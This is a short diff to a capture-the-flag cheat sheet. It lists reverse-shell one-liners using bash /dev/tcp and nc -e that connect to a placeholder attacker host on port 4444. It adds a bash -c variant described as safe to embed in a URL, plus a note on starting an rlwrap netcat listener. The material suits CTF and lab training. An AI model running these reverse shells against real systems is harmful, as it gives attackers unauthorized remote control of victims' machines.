@@ -152,7 +152,8 @@ Strings will print human readable chars of a file. And for a CTF if we are looki
   - `/bin/bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1`
   - `nc IP-OF-YOUR-KALI 4444 –e /bin/bash`
   - `nc IP-OF-YOUR-KALI 4444 –e /bin/sh`
-- *Note: We have to set a listener prior to this with `rlwrap nc -lvp 4444`*
+  - `bash -c 'bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1'` this one is symbol safe it is useful when doing it in an url or something like this.
+> *Note: We have to set a listener prior to this with `rlwrap nc -lvp 4444`*
 
 ## Permissions cheat sheet
 
